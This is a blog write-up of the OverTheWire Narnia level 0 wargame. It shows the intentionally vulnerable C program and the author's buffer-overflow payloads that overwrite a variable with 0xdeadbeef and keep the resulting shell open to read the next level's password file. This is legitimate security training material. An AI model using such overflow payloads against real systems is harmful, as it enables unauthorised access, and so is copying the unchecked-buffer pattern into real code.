---
layout:     post
title:      "Overthewire.org - Narnia 0 -> 1"
subtitle:   "Write-Up"
date:       2017-01-01 0:00:00
author:     "W3ndige"
header-img: "img/overthewire-header.png"
permalink: /:title/
category: Overthewire
---

<h1>Introduction</h1>

<p>As a part of my New Year's resolutions I decided to improve my knowledge of binary exploitation, learn more by completing challenges from <a href="http://overthewire.org/wargames/">OverTheWire</a>, especially Narnia, as they are aimed to people wanting to learn about basics. </p>

<h1>Challenge</h1>

<p>Firstly, let's take a look at the code of this program. </p>

{% highlight c %}
#include <stdio.h>
#include <stdlib.h>

int main(){
	long val=0x41414141;
	char buf[20];

	printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
	printf("Here is your chance: ");
	scanf("%24s",&buf);

	printf("buf: %s\n",buf);
	printf("val: 0x%08x\n",val);

	if(val==0xdeadbeef)
		system("/bin/sh");
	else {
		printf("WAY OFF!!!!\n");
		exit(1);
	}

	return 0;
}

{% endhighlight %}

<p>Okay, now we know that the binary accepts one string input from the user and puts the string into a buffer of 20 bytes, then if the value of variable <b>val</b> is equal to <b>0xdeadbeef</b>, we will get a shell. Let's try to send to 20 "A" characters, with 4 letters "B", in order to overflow the buffer, and overwrite the value of <b>0x41414141</b> with our "B" letters. </p>

{% highlight text %}
narnia0@melinda:/narnia$ python -c print'("A" * 20) + "BBBB"' | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAABBBB
val: 0x42424242
WAY OFF!!!!
narnia0@melinda:/narnia$
{% endhighlight %}

<p>Great, now we know that it works and we're one step closer to the solution. Now let's think how we can change value to <b>0xdeadbeef</b>. First thing to remember - the values need to be in hex format, not characters as I thought at first. In addition, I recalled that the bytes will be in reversed order, so we have to write them from the last to the first one. </p>

{% highlight text %}
narnia0@melinda:/narnia$ python -c print'("A" * 20) + "\xef\xbe\xad\xde"' | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef

{% endhighlight %}

<p>We got the shell but it closed immediately! Let's find a way to keep it running, in order to view the password to the next level. </p>

{% highlight text %}
narnia0@melinda:/narnia$ (python -c print'("A" * 20) + "\xef\xbe\xad\xde"'; cat /etc/narnia_pass/narnia1) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
cat: /etc/narnia_pass/narnia1: Permission denied
{% endhighlight %}

<p>Unfortunately, it closed too quickly and the command was executed after the shell had closed. I tried many other commands, and noticed something strange - <b>cat</b> seemed to do exactly what we want! </p>

{% highlight text %}
narnia0@melinda:/narnia$ (python -c print'("A" * 20) + "\xef\xbe\xad\xde"'; cat) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
whoami
narnia1
cat /etc/narnia_pass/narnia1
********
{% endhighlight %}

<p>But why is it working? From man page: </p>

<b>With no FILE, or when FILE is -, read standard input.</b>

<h1>Last words</h1>

<p>As I never tought before, this was a great challenge, and I think I got more interested in binary exploitation and reverse engineering. Can't wait to try out some other challenges, and I'll see you in the next one!</p>
